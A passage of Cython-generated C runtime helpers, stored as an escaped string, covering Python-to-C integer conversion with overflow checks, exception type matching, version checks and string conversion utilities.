__PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\\\n    {\\\n        func_type value = func_value;\\\n        if (sizeof(target_type) < sizeof(func_type)) {\\\n            if (unlikely(value != (func_type) (target_type) value)) {\\\n                func_type zero = 0;\\\n                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\\\n                    return (target_type) -1;\\\n                if (is_unsigned && unlikely(value < zero))\\\n                    goto raise_neg_overflow;\\\n                else\\\n                    goto raise_overflow;\\\n            }\\\n        }\\\n        return (target_type) value;\\\n    }\n\n/* CIntFromPy */\n    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wconversion\"\n#endif\n    const long neg_one = (long) -1, const_zero = (long) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n#if PY_MAJOR_VERSION < 3\n    if (likely(PyInt_Check(x))) {\n        if (sizeof(long) < sizeof(long)) {\n            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))\n        } else {\n            long val = PyInt_AS_LONG(x);\n            if (is_unsigned && unlikely(val < 0)) {\n                goto raise_neg_overflow;\n            }\n            return (long) val;\n        }\n    } else\n#endif\n    if (likely(PyLong_Check(x))) {\n        if (is_unsigned) {\n#if CYTHON_USE_PYLONG_INTERNALS\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\n            switch (Py_SIZE(x)) {\n                case  0: return (long) 0;\n                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])\n      ""          case 2:\n                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {\n                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n                case 3:\n                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {\n                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n                case 4:\n                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {\n                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n            }\n#endif\n#if CYTHO""N_COMPILING_IN_CPYTHON\n            if (unlikely(Py_SIZE(x) < 0)) {\n                goto raise_neg_overflow;\n            }\n#else\n            {\n                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\n                if (unlikely(result < 0))\n                    return (long) -1;\n                if (unlikely(result == 1))\n                    goto raise_neg_overflow;\n            }\n#endif\n            if (sizeof(long) <= sizeof(unsigned long)) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\n#endif\n            }\n        } else {\n#if CYTHON_USE_PYLONG_INTERNALS\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\n            switch (Py_SIZE(x)) {\n                case  0: return (long) 0;\n                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))\n                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])\n                case -2:\n                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\n                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 2:\n                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsign""ed long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\n                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case -3:\n                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\n                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 3:\n                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\n                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case -4:\n                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong""_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\n                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 4:\n                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\n                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n            }\n#endif\n            if (sizeof(long) <= sizeof(long)) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))\n#endif\n            }\n        }\n        {\n#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)\n            PyErr_SetString(PyExc_RuntimeError,\n                            \"_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers\");\n#else\n            long val;\n            PyObject *v = __Pyx_PyNumber_IntOrLong(x);\n #if PY_MAJOR_VERSION < 3\n            if (likely(v) && !PyLong_Check(v)) {\n                PyObject *tmp = v;\n                v = PyNumber_Long(""tmp);\n                Py_DECREF(tmp);\n            }\n #endif\n            if (likely(v)) {\n                int one = 1; int is_little = (int)*(unsigned char *)&one;\n                unsigned char *bytes = (unsigned char *)&val;\n                int ret = _PyLong_AsByteArray((PyLongObject *)v,\n                                              bytes, sizeof(val),\n                                              is_little, !is_unsigned);\n                Py_DECREF(v);\n                if (likely(!ret))\n                    return val;\n            }\n#endif\n            return (long) -1;\n        }\n    } else {\n        long val;\n        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);\n        if (!tmp) return (long) -1;\n        val = __Pyx_PyInt_As_long(tmp);\n        Py_DECREF(tmp);\n        return val;\n    }\nraise_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        \"value too large to convert to long\");\n    return (long) -1;\nraise_neg_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        \"can't convert negative value to long\");\n    return (long) -1;\n}\n\n/* CIntFromPy */\n    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wconversion\"\n#endif\n    const int neg_one = (int) -1, const_zero = (int) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n#if PY_MAJOR_VERSION < 3\n    if (likely(PyInt_Check(x))) {\n        if (sizeof(int) < sizeof(long)) {\n            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))\n        } else {\n            long val = PyInt_AS_LONG(x);\n            if (is_unsigned && unlikely(val < 0)) {\n                goto raise_neg_overflow;\n            }\n            return (int) val;\n        }\n    } else\n#endif\n    if (likely(PyLong_Check(x))) {\n        if (is_unsigned) {\n#if CYTHON_USE_PYLONG_INTERNALS\n            const digit* dig""its = ((PyLongObject*)x)->ob_digit;\n            switch (Py_SIZE(x)) {\n                case  0: return (int) 0;\n                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])\n                case 2:\n                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {\n                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n                case 3:\n                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {\n                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n                case 4:\n                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {\n                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_S""HIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n            }\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON\n            if (unlikely(Py_SIZE(x) < 0)) {\n                goto raise_neg_overflow;\n            }\n#else\n            {\n                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\n                if (unlikely(result < 0))\n                    return (int) -1;\n                if (unlikely(result == 1))\n                    goto raise_neg_overflow;\n            }\n#endif\n            if (sizeof(int) <= sizeof(unsigned long)) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\n#endif\n            }\n        } else {\n#if CYTHON_USE_PYLONG_INTERNALS\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\n            switch (Py_SIZE(x)) {\n                case  0: return (int) 0;\n                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))\n                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])\n                case -2:\n                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\n                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 2:\n                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {\n     ""                   if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\n                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case -3:\n                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\n                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 3:\n                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\n                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case -4:\n                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                         ""   __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {\n                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 4:\n                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {\n                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n            }\n#endif\n            if (sizeof(int) <= sizeof(long)) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))\n#endif\n            }\n        }\n        {\n#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)\n            PyErr_SetString(PyExc_RuntimeError,\n                            \"_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers\");\n#else\n            int val;\n            PyObject *v = __Pyx_PyNumber_IntOrLong(x);\n #if PY_MAJOR_VERSION < 3\n      ""      if (likely(v) && !PyLong_Check(v)) {\n                PyObject *tmp = v;\n                v = PyNumber_Long(tmp);\n                Py_DECREF(tmp);\n            }\n #endif\n            if (likely(v)) {\n                int one = 1; int is_little = (int)*(unsigned char *)&one;\n                unsigned char *bytes = (unsigned char *)&val;\n                int ret = _PyLong_AsByteArray((PyLongObject *)v,\n                                              bytes, sizeof(val),\n                                              is_little, !is_unsigned);\n                Py_DECREF(v);\n                if (likely(!ret))\n                    return val;\n            }\n#endif\n            return (int) -1;\n        }\n    } else {\n        int val;\n        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);\n        if (!tmp) return (int) -1;\n        val = __Pyx_PyInt_As_int(tmp);\n        Py_DECREF(tmp);\n        return val;\n    }\nraise_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        \"value too large to convert to int\");\n    return (int) -1;\nraise_neg_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        \"can't convert negative value to int\");\n    return (int) -1;\n}\n\n/* FastTypeChecks */\n    #if CYTHON_COMPILING_IN_CPYTHON\nstatic int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {\n    while (a) {\n        a = a->tp_base;\n        if (a == b)\n            return 1;\n    }\n    return b == &PyBaseObject_Type;\n}\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {\n    PyObject *mro;\n    if (a == b) return 1;\n    mro = a->tp_mro;\n    if (likely(mro)) {\n        Py_ssize_t i, n;\n        n = PyTuple_GET_SIZE(mro);\n        for (i = 0; i < n; i++) {\n            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)\n                return 1;\n        }\n        return 0;\n    }\n    return __Pyx_InBases(a, b);\n}\n#if PY_MAJOR_VERSION == 2\nstatic int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, Py""Object* exc_type2) {\n    PyObject *exception, *value, *tb;\n    int res;\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ErrFetch(&exception, &value, &tb);\n    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;\n    if (unlikely(res == -1)) {\n        PyErr_WriteUnraisable(err);\n        res = 0;\n    }\n    if (!res) {\n        res = PyObject_IsSubclass(err, exc_type2);\n        if (unlikely(res == -1)) {\n            PyErr_WriteUnraisable(err);\n            res = 0;\n        }\n    }\n    __Pyx_ErrRestore(exception, value, tb);\n    return res;\n}\n#else\nstatic CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {\n    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;\n    if (!res) {\n        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);\n    }\n    return res;\n}\n#endif\nstatic int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {\n    Py_ssize_t i, n;\n    assert(PyExceptionClass_Check(exc_type));\n    n = PyTuple_GET_SIZE(tuple);\n#if PY_MAJOR_VERSION >= 3\n    for (i=0; i<n; i++) {\n        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;\n    }\n#endif\n    for (i=0; i<n; i++) {\n        PyObject *t = PyTuple_GET_ITEM(tuple, i);\n        #if PY_MAJOR_VERSION < 3\n        if (likely(exc_type == t)) return 1;\n        #endif\n        if (likely(PyExceptionClass_Check(t))) {\n            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;\n        } else {\n        }\n    }\n    return 0;\n}\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {\n    if (likely(err == exc_type)) return 1;\n    if (likely(PyExceptionClass_Check(err))) {\n        if (likely(PyExceptionClass_Check(exc_type))) {\n            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);\n        } else if (likely(Py""Tuple_Check(exc_type))) {\n            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);\n        } else {\n        }\n    }\n    return PyErr_GivenExceptionMatches(err, exc_type);\n}\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {\n    assert(PyExceptionClass_Check(exc_type1));\n    assert(PyExceptionClass_Check(exc_type2));\n    if (likely(err == exc_type1 || err == exc_type2)) return 1;\n    if (likely(PyExceptionClass_Check(err))) {\n        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);\n    }\n    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));\n}\n#endif\n\n/* CheckBinaryVersion */\n    static int __Pyx_check_binary_version(void) {\n    char ctversion[5];\n    int same=1, i, found_dot;\n    const char* rt_from_call = Py_GetVersion();\n    PyOS_snprintf(ctversion, 5, \"%d.%d\", PY_MAJOR_VERSION, PY_MINOR_VERSION);\n    found_dot = 0;\n    for (i = 0; i < 4; i++) {\n        if (!ctversion[i]) {\n            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');\n            break;\n        }\n        if (rt_from_call[i] != ctversion[i]) {\n            same = 0;\n            break;\n        }\n    }\n    if (!same) {\n        char rtversion[5] = {'\\0'};\n        char message[200];\n        for (i=0; i<4; ++i) {\n            if (rt_from_call[i] == '.') {\n                if (found_dot) break;\n                found_dot = 1;\n            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {\n                break;\n            }\n            rtversion[i] = rt_from_call[i];\n        }\n        PyOS_snprintf(message, sizeof(message),\n                      \"compiletime version %s of module '%.100s' \"\n                      \"does not match runtime version %s\",\n                      ctversion, __Pyx_MODULE_NAME, rtversion);\n        return PyErr_WarnEx(NULL, message, 1);\n    }\n    return ""0;\n}\n\n/* InitStrings */\n    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {\n    while (t->p) {\n        #if PY_MAJOR_VERSION < 3\n        if (t->is_unicode) {\n            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);\n        } else if (t->intern) {\n            *t->p = PyString_InternFromString(t->s);\n        } else {\n            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);\n        }\n        #else\n        if (t->is_unicode | t->is_str) {\n            if (t->intern) {\n                *t->p = PyUnicode_InternFromString(t->s);\n            } else if (t->encoding) {\n                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);\n            } else {\n                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);\n            }\n        } else {\n            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);\n        }\n        #endif\n        if (!*t->p)\n            return -1;\n        if (PyObject_Hash(*t->p) == -1)\n            return -1;\n        ++t;\n    }\n    return 0;\n}\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {\n    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));\n}\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {\n    Py_ssize_t ignore;\n    return __Pyx_PyObject_AsStringAndSize(o, &ignore);\n}\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\n#if !CYTHON_PEP393_ENABLED\nstatic const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n    char* defenc_c;\n    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);\n    if (!defenc) return NULL;\n    defenc_c = PyBytes_AS_STRING(defenc);\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n    {\n        char* end = defenc_c + PyBytes_GET_SIZE(defenc);\n        char* c;\n        for (c = defenc_c; c < end; c++) {\n            if ((unsigned char) (*c) >= 128) {\n                PyUnicode_AsASCIIString(o);""\n                return NULL;\n            }\n        }\n    }\n#endif\n    *length = PyBytes_GET_SIZE(defenc);\n    return defenc_c;\n}\n#else\nstatic CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n    if (likely(PyUnicode_IS_ASCII(o))) {\n        *length = PyUnicode_GET_LENGTH(o);\n        return PyUnicode_AsUTF8(o);\n    } else {\n        PyUnicode_AsASCIIString(o);\n        return NULL;\n    }\n#else\n    return PyUnicode_AsUTF8AndSize(o, length);\n#endif\n}\n#endif\n#endif\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\n    if (\n#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n            __Pyx_sys_getdefaultencoding_not_ascii &&\n#endif\n            PyUnicode_Check(o)) {\n        return __Pyx_PyUnicode_AsStringAndSize(o, length);\n    } else\n#endif\n#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))\n    if (PyByteArray_Check(o)) {\n        *length = PyByteArray_GET_SIZE(o);\n        return PyByteArray_AS_STRING(o);\n    } else\n#endif\n    {\n        char* result;\n        int r = PyBytes_AsStringAndSize(o, &result, length);\n        if (unlikely(r < 0)) {\n            return NULL;\n        } else {\n            return result;\n        }\n    }\n}\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {\n   int is_true = x == Py_True;\n   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;\n   else return PyObject_IsTrue(x);\n}\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {\n    int retval;\n    if (unlikely(!x)) return -1;\n    retval = __Pyx_PyObject_IsTrue(x);\n    Py_DECREF(x);\n    return retval;\n}\nstatic PyObject* __Pyx_PyNumber_IntOrLongWrongResul""tType(PyObject* result, const char* type_name) {\n#if PY_MAJOR_VERSION >= 3\n    if (PyLong_Check(result)) {\n        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\n                \"__int__ returned non-int (type %.200s).  \"\n                \"The ability to return an instance of a strict subclass of int \"\n                \"is deprecated, and may be removed in a future version of Python.\",\n                Py_TYPE(result)->tp_name)) {\n            Py_DECREF(result);\n            return NULL;\n        }\n        return result;\n    }\n#endif\n    PyErr_Format(PyExc_TypeError,\n                 \"__%.4s__ returned non-%.4s (type %.200s)\",\n                 type_name, type_name, Py_TYPE(result)->tp_name);\n    Py_DECREF(result);\n    return NULL;\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {\n#if CYTHON_USE_TYPE_SLOTS\n  PyNumberMethods *m;\n#endif\n  const char *name = NULL;\n  PyObject *res = NULL;\n#if PY_MAJOR_VERSION < 3\n  if (likely(PyInt_Check(x) || PyLong_Check(x)))\n#else\n  if (likely(PyLong_Check(x)))\n#endif\n    return __Pyx_NewRef(x);\n#if CYTHON_USE_TYPE_SLOTS\n  m = Py_TYPE(x)->tp_as_number;\n  #if PY_MAJOR_VERSION < 3\n  if (m && m->nb_int) {\n    name = \"int\";\n    res = m->nb_int(x);\n  }\n  else if (m && m->nb_long) {\n    name = \"long\";\n    res = m->nb_long(x);\n  }\n  #else\n  if (likely(m && 